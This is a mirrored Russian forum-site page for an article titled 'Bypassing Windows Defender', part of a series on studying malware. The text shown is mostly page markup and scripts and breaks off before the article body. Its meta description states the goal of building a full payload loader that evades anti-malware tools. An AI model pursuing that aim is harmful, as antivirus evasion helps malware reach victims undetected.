<!DOCTYPE html>
<html id="XF" lang="ru-RU" dir="LTR"
	data-xf="2.3"
	data-app="public"
	data-variation="alternate"
	data-color-scheme="dark"
	data-template="xa_ams_article_page_view"
	data-container-key="amsCategory-2"
	data-content-key=""
	data-logged-in="false"
	data-cookie-prefix="xf_"
	data-csrf="1758965539,9c7cce9759db13dde4401ae8d2bd6eb4"
	class="has-no-js template-xa_ams_article_page_view"
	>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/obkhod-windows-defender.35/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:42:39 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
	<link rel="icon" href="../../../../favicon.ico" type="image/x-icon">
	
	
	

	<meta charset="utf-8" />
	<title>Цикл статей &quot;Изучение вредоносных программ&quot; | Обход Windows defender | Osint42.Org - Безопасность и код</title>
	<link rel="manifest" crossorigin="use-credentials" href="../../../../webmanifest.php">

	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">

	
		
			<meta name="theme-color" content="#0a1c29" />
		
	

	<meta name="apple-mobile-web-app-title" content="Osint42.Org - Безопасность и код">
	
		<link rel="apple-touch-icon" href="../../../../data/assets/logo/192192.png">
		

	
		
		<meta property="og:title" content="Обход Windows defender | Цикл статей &quot;Изучение вредоносных программ&quot;" />
		<meta property="twitter:title" content="Обход Windows defender | Цикл статей &quot;Изучение вредоносных программ&quot;" />
	
	
		
		<meta name="description" content="Введение

До сих пор было продемонстрировано множество методов и техник создания и выполнения загрузчика payload, который может обходить различные программы..." />
		<meta property="og:description" content="Введение

До сих пор было продемонстрировано множество методов и техник создания и выполнения загрузчика payload, который может обходить различные программы защиты от вредоносного кода. Эта статья будет работать над созданием полнофункционального..." />
		<meta property="twitter:description" content="Введение

До сих пор было продемонстрировано множество методов и техник создания и выполнения загрузчика payload, который может обходить различные программы защиты от вредоносного кода. Эта статья..." />
	
	
		<meta property="og:type" content="article" />
	
		<meta property="og:url" content="index.html" />
	
		<link rel="canonical" href="index.html" />
	
		
		<meta property="og:image" content="1746788137329.png" />
		<meta property="twitter:image" content="1746788137329.png" />
		<meta property="twitter:card" content="summary_large_image" />
	
	

	
		
	
	
	<meta property="og:site_name" content="Osint42.Org - Безопасность и код" />


	
	
	
	
	
	

	
	
	
		
	
	

	<link rel="stylesheet" href="../../../../cssf1bd.css?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Avariations.less%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=650febe17d52673553ff8fcab924bc52ae7c26c5" />

	<link rel="stylesheet" href="../../../../cssa4a6.css?css=public%3Aalnb_navigation.less%2Cpublic%3Abb_code.less%2Cpublic%3Alightbox.less%2Cpublic%3Anotices.less%2Cpublic%3Ashare_controls.less%2Cpublic%3Axa_ams.less%2Cpublic%3Axa_ams_comment.less%2Cpublic%3Aextra.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=ecd081a308b705ae506a43d4915bd16740d009d9" />


	
		<script data-cfasync="false" src="../../../../js/xf/preamble.minf74f.js?_v=01eb82fa"></script>
	

	
	<script data-cfasync="false" src="../../../../js/vendor/vendor-compiledf74f.js?_v=01eb82fa" defer></script>
	<script data-cfasync="false" src="../../../../js/xf/core-compiledf74f.js?_v=01eb82fa" defer></script>

	<script data-cfasync="false">
		XF.ready(() =>
		{
			XF.extendObject(true, XF.config, {
				// 
				userId: 0,
				enablePush: true,
				pushAppServerKey: 'BA479YFsUh5Dh5bOkTEWM7LoORrEgUroE2adYpgA6_NLt6AmfJFBdCBxt_i9NhpAIXJviINVU4JDqWxez0NnB-w',
				url: {
					fullBase: 'https://osint42.org/',
					basePath: '/',
					css: '/css.php?css=__SENTINEL__&s=1&l=2&d=1758392320',
					js: '/js/__SENTINEL__?_v=01eb82fa',
					icon: '/data/local/icons/__VARIANT__.svg?v=1757401797#__NAME__',
					iconInline: '/styles/fa/__VARIANT__/__NAME__.svg?v=5.15.3',
					keepAlive: '/login/keep-alive'
				},
				cookie: {
					path: '/',
					domain: '',
					prefix: 'xf_',
					secure: true,
					consentMode: 'disabled',
					consented: ["optional","_third_party"]
				},
				cacheKey: '60356f7aa4f82ca98e605b4e87a0a057',
				csrf: '1758965539,9c7cce9759db13dde4401ae8d2bd6eb4',
				js: {"\/js\/xf\/lightbox-compiled.js?_v=01eb82fa":true,"\/js\/xf\/code_block-compiled.js?_v=01eb82fa":true,"\/js\/copycode\/copycode.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/4.4.1\/socket.io.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/socket-conv.min.js?_v=01eb82fa":true},
				fullJs: false,
				css: {"public:alnb_navigation.less":true,"public:bb_code.less":true,"public:lightbox.less":true,"public:notices.less":true,"public:share_controls.less":true,"public:xa_ams.less":true,"public:xa_ams_comment.less":true,"public:extra.less":true},
				time: {
					now: 1758965539,
					today: 1758920400,
					todayDow: 6,
					tomorrow: 1759006800,
					yesterday: 1758834000,
					week: 1758402000,
					month: 1756674000,
					year: 1735678800
				},
				style: {
					light: 'default',
					dark: 'alternate',
					defaultColorScheme: 'light'
				},
				borderSizeFeature: '3px',
				fontAwesomeWeight: 'r',
				enableRtnProtect: true,
				
				enableFormSubmitSticky: true,
				imageOptimization: '0',
				imageOptimizationQuality: 0.85,
				uploadMaxFilesize: 3145728,
				uploadMaxWidth: 0,
				uploadMaxHeight: 0,
				allowedVideoExtensions: ["m4v","mov","mp4","mp4v","mpeg","mpg","ogv","webm"],
				allowedAudioExtensions: ["mp3","opus","ogg","wav"],
				shortcodeToEmoji: true,
				visitorCounts: {
					conversations_unread: '0',
					alerts_unviewed: '0',
					total_unread: '0',
					title_count: true,
					icon_indicator: true
				},
				jsMt: {"xf\/action.js":"dc2375bf","xf\/embed.js":"d3d00259","xf\/form.js":"d3d00259","xf\/structure.js":"dc2375bf","xf\/tooltip.js":"d3d00259"},
				jsState: {},
				publicMetadataLogoUrl: 'https://osint42.org/data/assets/logo/192192.png',
				publicPushBadgeUrl: 'https://osint42.org/styles/default/xenforo/bell.png'
			})

			XF.extendObject(XF.phrases, {
				// 
"svStandardLib_time.day": "{count} day",
"svStandardLib_time.days": "{count} дней",
"svStandardLib_time.hour": "{count} hour",
"svStandardLib_time.hours": "{count} часов",
"svStandardLib_time.minute": "{count} минут",
"svStandardLib_time.minutes": "{count} минут",
"svStandardLib_time.month": "{count} month",
"svStandardLib_time.months": "{count} месяцев",
"svStandardLib_time.second": "{count} second",
"svStandardLib_time.seconds": "{count} секунд",
"svStandardLib_time.week": "time.week",
"svStandardLib_time.weeks": "{count} недель",
"svStandardLib_time.year": "{count} year",
"svStandardLib_time.years": "{count} лет",
copy_to_clipboard: "Скопировать в буфер обмена",
text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
				date_x_at_time_y:     "{date} в {time}",
				day_x_at_time_y:      "{day} в {time}",
				yesterday_at_x:       "Вчера в {time}",
				x_minutes_ago:        "{minutes} мин. назад",
				one_minute_ago:       "Минуту назад",
				a_moment_ago:         "Только что",
				today_at_x:           "Сегодня в {time}",
				in_a_moment:          "Через секунду",
				in_a_minute:          "Через минуту",
				in_x_minutes:         "Через {minutes} мин.",
				later_today_at_x:     "Сегодня в {time}",
				tomorrow_at_x:        "Завтра в {time}",
				short_date_x_minutes: "{minutes} м.",
				short_date_x_hours:   "{hours} ч.",
				short_date_x_days:    "{days} д.",

				day0: "Воскресенье",
				day1: "Понедельник",
				day2: "Вторник",
				day3: "Среда",
				day4: "Четверг",
				day5: "Пятница",
				day6: "Суббота",

				dayShort0: "Вс",
				dayShort1: "Пн",
				dayShort2: "Вт",
				dayShort3: "Ср",
				dayShort4: "Чт",
				dayShort5: "Пт",
				dayShort6: "Сб",

				month0: "Январь",
				month1: "Февраль",
				month2: "Март",
				month3: "Апрель",
				month4: "Май",
				month5: "Июнь",
				month6: "Июль",
				month7: "Август",
				month8: "Сентябрь",
				month9: "Октябрь",
				month10: "Ноябрь",
				month11: "Декабрь",

				active_user_changed_reload_page: "Ваша сессия истекла. Перезагрузите страницу.",
				server_did_not_respond_in_time_try_again: "Сервер не ответил вовремя. Пожалуйста, попробуйте снова.",
				oops_we_ran_into_some_problems: "Упс! Мы столкнулись с некоторыми проблемами.",
				oops_we_ran_into_some_problems_more_details_console: "Упс! Мы столкнулись с некоторыми проблемами. Пожалуйста, попробуйте позже. Более детальную информацию об ошибке Вы можете посмотреть в консоли браузера",
				file_too_large_to_upload: "Файл слишком большой для загрузки.",
				uploaded_file_is_too_large_for_server_to_process: "Загружаемый файл слишком большой для обработки сервером.",
				files_being_uploaded_are_you_sure: "Файлы ещё загружаются. Вы уверены, что хотите отправить эту форму?",
				attach: "Прикрепить файлы",
				rich_text_box: "Текстовое поле с поддержкой форматирования",
				close: "Закрыть",
				link_copied_to_clipboard: "Ссылка скопирована в буфер обмена.",
				text_copied_to_clipboard: "Текст скопирован в буфер обмена.",
				loading: "Загрузка...",
				you_have_exceeded_maximum_number_of_selectable_items: "Вы превысили максимальное количество выбираемых элементов.",

				processing: "Обработка",
				'processing...': "Обработка...",

				showing_x_of_y_items: "Показано {count} из {total} элементов",
				showing_all_items: "Показаны все элементы",
				no_items_to_display: "Нет элементов для отображения",

				number_button_up: "Увеличить",
				number_button_down: "Уменьшить",

				push_enable_notification_title: "Push-уведомления для сайта Osint42.Org - Безопасность и код успешно включены",
				push_enable_notification_body: "Спасибо за включение push-уведомлений!",

				pull_down_to_refresh: "Потяните вниз для обновления",
				release_to_refresh: "Отпустите для обновления",
				refreshing: "Обновление..."
			})
		})
	

window.addEventListener('DOMContentLoaded',()=>{XF.Push.updateUserSubscriptionParent=XF.Push.updateUserSubscription;XF.Push.updateUserSubscription=function(b,a){"unsubscribe"===a&&XF.browser.safari&&XF.Push.setPushHistoryUserIds({});XF.Push.updateUserSubscriptionParent(b,a)}});
</script>

	<script data-cfasync="false" src="../../../../js/xf/lightbox-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/xf/code_block-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/copycode/copycode.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/DCom/LiveContent/4.4.1/socket.io.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../../../js/DCom/LiveContent/socket-conv.minf74f.js?_v=01eb82fa" defer></script>



	
		<link rel="icon" type="image/png" href="../../../../data/assets/logo/favicon.png" sizes="32x32" />
	

	
	
</head>
<body data-template="xa_ams_article_page_view">

<div class="p-pageWrapper" id="top">

	

	<header class="p-header" id="header">
		<div class="p-header-inner">
			<div class="p-header-content">
				<div class="p-header-logo p-header-logo--image">
					<a href="../../../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;}}">
		
		
		

		

		<img src="../../../../data/assets/logo_alternate/osint4242.png" srcset="/data/assets/logo_alternate/osint4242.png 2x" width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
	</picture>


					</a>
				</div>

				
			</div>
		</div>
	</header>

	
	

	
		<div class="p-navSticky p-navSticky--primary" data-xf-init="sticky-header">
			
		<nav class="p-nav">
			<div class="p-nav-inner">
				<button type="button" class="button button--plain p-nav-menuTrigger" data-xf-click="off-canvas" data-menu=".js-headerOffCanvasMenu" tabindex="0" aria-label="Меню"><span class="button-text">
					<i aria-hidden="true"></i>
				</span></button>

				<div class="p-nav-smallLogo">
					<a href="../../../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:null},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:null}}">
		
		
		

		

		<img src="../../../../data/assets/logo_alternate/osint4242.png"  width="100" height="36" alt="Osint42.Org - Безопасность и код"  />
	</picture>


					</a>
				</div>

				<div class="p-nav-scroller hScroller" data-xf-init="h-scroller" data-auto-scroll=".p-navEl.is-selected">
					<div class="hScroller-scroll">
						<ul class="p-nav-list js-offCanvasNavSource">
							
								<li>
									
	<div class="p-navEl is-selected" data-has-children="true">
	

		
	
	<a href="../../../../index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xa_ams">Статьи</a>


		<a data-xf-key="1"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewArticles">Новые статьи</a>

	

				
					
	
	
	<a href="../../../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewComments">Новые комментарии</a>

	

				
					
	
	
	<a href="../../../authors/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xa_amsAuthorList">Список авторов</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../../../forums/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="forums">Форум</a>


		<a data-xf-key="2"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="newPosts">Новые сообщения</a>

	

				
					
	
	
	<a href="../../../../search/index4009.html?type=post"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="searchForums">Поиск по форуму</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../../../whats-new/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="whatsNew">Что нового</a>


		<a data-xf-key="3"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="whatsNewPosts">Новые сообщения</a>

	

				
					
	
	
	<a href="../../../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewNewArticles">Новые статьи</a>

	

				
					
	
	
	<a href="../../../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgWhatsNewNewMedia">Новые медиа</a>

	

				
					
	
	
	<a href="../../../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewArticleComments">Новые комментарии к статье</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../../../media/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xfmg">Медиа</a>


		<a data-xf-key="4"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewMedia">Новые медиа</a>

	

				
					
	
	
	<a href="../../../../whats-new/media-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewComments">Новые комментарии</a>

	

				
					
	
	
	<a href="../../../../search/index4784.html?type=xfmg_media"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xfmgSearchMedia">Поиск медиа</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="https://osint42.org/members/"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="members">Пользователи</a>


		<a data-xf-key="5"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="Переключатель раскрытия"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="https://osint42.org/online/"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="currentVisitors">Сейчас на форуме</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>

				<div class="p-nav-opposite">
					<div class="p-navgroup p-account p-navgroup--guest">
						
							<a href="../../../../login/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--logIn"
								data-xf-click="overlay" data-follow-redirects="on">
								<span class="p-navgroup-linkText">Вход</span>
							</a>
							
								<a href="../../../../register/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--register"
									data-xf-click="overlay" data-follow-redirects="on">
									<span class="p-navgroup-linkText">Регистрация</span>
								</a>
							
						
					</div>
					
					
    <a href="https://osint42.org/misc/style-variation"
       class="p-navgroup-link p-navgroup-link--iconic js-styleVariationsLink"
       data-xf-click="menu"
       data-menu-pos-ref="< .p-navgroup"
       aria-label=" Выбор стиля"
       aria-expanded="false"
       aria-haspopup="true"
       title=" Выбор стиля">
        <i aria-hidden="true">
            <i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
        </i>
        <span class="p-navgroup-linkText"> Выбор стиля</span>
    </a>

    <div class="menu menu--structural" data-menu="menu" aria-hidden="true">
        <div class="menu-content js-styleVariationsMenu">
            

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965539%2C9c7cce9759db13dde4401ae8d2bd6eb4"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			Системный
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965539%2C9c7cce9759db13dde4401ae8d2bd6eb4"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			Светлый
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965539%2C9c7cce9759db13dde4401ae8d2bd6eb4"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			Тёмный
		
	</a>

	

	
		
	

        </div>
    </div>



					<div class="p-navgroup p-discovery">
						<a href="../../../../whats-new/index.html"
							

	class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--whatsnew"

							aria-label="Что нового"
							title="Что нового">
							<i aria-hidden="true"></i>
							<span class="p-navgroup-linkText">Что нового</span>
						</a>

						
							<a href="../../../../search/index.html"
								class="p-navgroup-link p-navgroup-link--iconic p-navgroup-link--search"
								data-xf-click="menu"
								data-xf-key="/"
								aria-label="Поиск"
								aria-expanded="false"
								aria-haspopup="true"
								title="Поиск">
								<i aria-hidden="true"></i>
								<span class="p-navgroup-linkText">Поиск</span>
							</a>
							<div class="menu menu--structural menu--wide" data-menu="menu" aria-hidden="true">
								<form action="https://osint42.org/search/search" method="post"
									class="menu-content"
									data-xf-init="quick-search">

									<h3 class="menu-header">Поиск</h3>
									
									<div class="menu-row">
										
											<div class="inputGroup inputGroup--joined">
												<input type="text" class="input" name="keywords" data-acurl="/search/auto-complete" placeholder="Поиск..." aria-label="Поиск" data-menu-autofocus="true" />
												
			<select name="constraints" class="js-quickSearch-constraint input" aria-label="Поиск в">
				<option value="">Везде</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;}">Статьи</option>
<option value="{&quot;search_type&quot;:&quot;ams_article&quot;,&quot;c&quot;:{&quot;categories&quot;:[2],&quot;child_categories&quot;:1}}">Эта категория</option>

			</select>
		
											</div>
										
									</div>

									
									<div class="menu-row">
										<label class="iconic"><input type="checkbox"  name="c[title_only]" value="1" /><i aria-hidden="true"></i><span class="iconic-label">Искать только в заголовках

													
													<span tabindex="0" role="button"
														data-xf-init="tooltip" data-trigger="hover focus click" title="Теги также будут учитываться">

														<i class="fa--xf far fa-question-circle  u-muted u-smaller"><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Примечание</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#question-circle"></use></svg></i>
													</span></span></label>

									</div>
									
									<div class="menu-row">
										<div class="inputGroup">
											<span class="inputGroup-text" id="ctrl_search_menu_by_member">Автор:</span>
											<input type="text" class="input" name="c[users]" data-xf-init="auto-complete" placeholder="Пользователь" aria-labelledby="ctrl_search_menu_by_member" />
										</div>
									</div>
									<div class="menu-footer">
									<span class="menu-footer-controls">
										<button type="submit" class="button button--icon button--icon--search button--primary"><i class="fa--xf far fa-search "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#search"></use></svg></i><span class="button-text">Найти</span></button>
										<button type="submit" class="button " name="from_search_menu"><span class="button-text">Расширенный поиск...</span></button>
									</span>
									</div>

									<input type="hidden" name="_xfToken" value="1758965539,9c7cce9759db13dde4401ae8d2bd6eb4" />
								</form>
							</div>
						
					</div>
				</div>
			</div>
		</nav>
	
		</div>
		
		
			<div class="p-sectionLinks">
				<div class="p-sectionLinks-inner hScroller" data-xf-init="h-scroller">
					<div class="hScroller-scroll">
						<ul class="p-sectionLinks-list">
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../../../whats-new/ams-articles/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+1"
	data-nav-id="xa_amsNewArticles">Новые статьи</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../../../whats-new/ams-comments/index.html"
	class="p-navEl-link "
	 rel="nofollow"
	data-xf-key="alt+2"
	data-nav-id="xa_amsNewComments">Новые комментарии</a>


		

		
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " >
	

		
	
	<a href="../../../authors/index.html"
	class="p-navEl-link "
	
	data-xf-key="alt+3"
	data-nav-id="xa_amsAuthorList">Список авторов</a>


		

		
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>
			</div>
			
	
		

	<div class="offCanvasMenu offCanvasMenu--nav js-headerOffCanvasMenu" data-menu="menu" aria-hidden="true" data-ocm-builder="navigation">
		<div class="offCanvasMenu-backdrop" data-menu-close="true"></div>
		<div class="offCanvasMenu-content">
			<div class="offCanvasMenu-header">
				Меню
				<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" aria-label="Закрыть"></a>
			</div>
			
				<div class="p-offCanvasRegisterLink">
					<div class="offCanvasMenu-linkHolder">
						<a href="../../../../login/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
							Вход
						</a>
					</div>
					<hr class="offCanvasMenu-separator" />
					
						<div class="offCanvasMenu-linkHolder">
							<a href="../../../../register/index.html" class="offCanvasMenu-link" data-xf-click="overlay" data-menu-close="true">
								Регистрация
							</a>
						</div>
						<hr class="offCanvasMenu-separator" />
					
				</div>
			
			<div class="js-offCanvasNavTarget"></div>
			<div class="offCanvasMenu-installBanner js-installPromptContainer" style="display: none;" data-xf-init="install-prompt">
				<div class="offCanvasMenu-installBanner-header">Установить приложение</div>
				<button type="button" class="button js-installPromptButton"><span class="button-text">Установить</span></button>
				<template class="js-installTemplateIOS">
					<div class="js-installTemplateContent">
						<div class="overlay-title">Как установить приложение на iOS</div>
						<div class="block-body">
							<div class="block-row">
								<p>
									Следуйте инструкциям в видео ниже, чтобы узнать, как установить наш сайт как веб-приложение на главный экран вашего устройства.
								</p>
								<p style="text-align: center">
									<video src="../../../../styles/default/xenforo/add_to_home_new.mp4"
										width="280" height="480" autoplay loop muted playsinline></video>
								</p>
								<p>
									<small><strong>Примечание:</strong> Эта функция может быть недоступна в некоторых браузерах.</small>
								</p>
							</div>
						</div>
					</div>
				</template>
			</div>
		</div>
	</div>

	<div class="p-body">
		<div class="p-body-inner">
			<!--XF:EXTRA_OUTPUT-->


			
				
	
		
		

		<ul class="notices notices--block  js-notices"
			data-xf-init="notices"
			data-type="block"
			data-scroll-interval="6">

			
				
	<li class="notice js-notice notice--primary notice--hasImage"
		data-notice-id="1"
		data-delay-duration="0"
		data-display-duration="0"
		data-auto-dismiss=""
		data-visibility="">

		
			<div class="notice-image"><img src="../../../../data/assets/notice_images/c7eb1746-6291-4d37-b72b-8e3b5cfd1303.png" alt="" /></div>
		
		<div class="notice-content">
			
			<div class="block"
     style="border:1px solid #ccc;
            border-radius:8px;
            padding:min(4vw,15px);
            background:var(--xf-contentBg);
            box-shadow:0 0 8px rgba(0,0,0,.1);
            width:100%;
            max-width:clamp(480px,90vw,1200px);
            margin:0 auto;
            box-sizing:border-box;
            overflow:hidden;">

  <div class="block-container">
    <h3 class="block-header"
        style="font-size:clamp(1rem,4vw,1.125rem);
               margin:0 0 10px 0;">
      📡 Наши контакты
    </h3>

    <div class="block-body" style="line-height:1.4;">

      <!-- Email -->
      <p style="margin:8px 0;">
        ✉️ Email:
        <a href="../../../../cdn-cgi/l/email-protection.html#abc2c5cdc4ebc4d8c2c5df9f9985c8c4c6" style="color:#2ecc71;
                  font-weight:bold;
                  overflow-wrap:anywhere;
                  text-decoration:none;">
          <span class="__cf_email__" data-cfemail="cba2a5ada48ba4b8a2a5bffff9e5a8a4a6">[email&#160;protected]</span>
        </a>
      </p>

      <div class="ya-site-form ya-site-form_inited_no" data-bem="{&quot;action&quot;:&quot;https://yandex.ru/search/site/&quot;,&quot;arrow&quot;:false,&quot;bg&quot;:&quot;transparent&quot;,&quot;fontsize&quot;:12,&quot;fg&quot;:&quot;#000000&quot;,&quot;language&quot;:&quot;ru&quot;,&quot;logo&quot;:&quot;rb&quot;,&quot;publicname&quot;:&quot;Поиск по osint42.com&quot;,&quot;suggest&quot;:true,&quot;target&quot;:&quot;_blank&quot;,&quot;tld&quot;:&quot;ru&quot;,&quot;type&quot;:2,&quot;usebigdictionary&quot;:true,&quot;searchid&quot;:13900241,&quot;input_fg&quot;:&quot;#000000&quot;,&quot;input_bg&quot;:&quot;#ffffff&quot;,&quot;input_fontStyle&quot;:&quot;normal&quot;,&quot;input_fontWeight&quot;:&quot;normal&quot;,&quot;input_placeholder&quot;:&quot;Поиск по сайту&quot;,&quot;input_placeholderColor&quot;:&quot;#000000&quot;,&quot;input_borderColor&quot;:&quot;#7f9db9&quot;}"><form action="https://yandex.ru/search/site/" method="get" target="_blank" accept-charset="utf-8"><input type="hidden" name="searchid" value="13900241"/><input type="hidden" name="l10n" value="ru"/><input type="hidden" name="reqenc" value=""/><input type="search" name="text" value=""/><input type="submit" value="Найти"/></form></div><style type="text/css">.ya-page_js_yes .ya-site-form_inited_no { display: none; }</style><script type="text/javascript">(function(w,d,c){var s=d.createElement('script'),h=d.getElementsByTagName('script')[0],e=d.documentElement;if((' '+e.className+' ').indexOf(' ya-page_js_yes ')===-1){e.className+=' 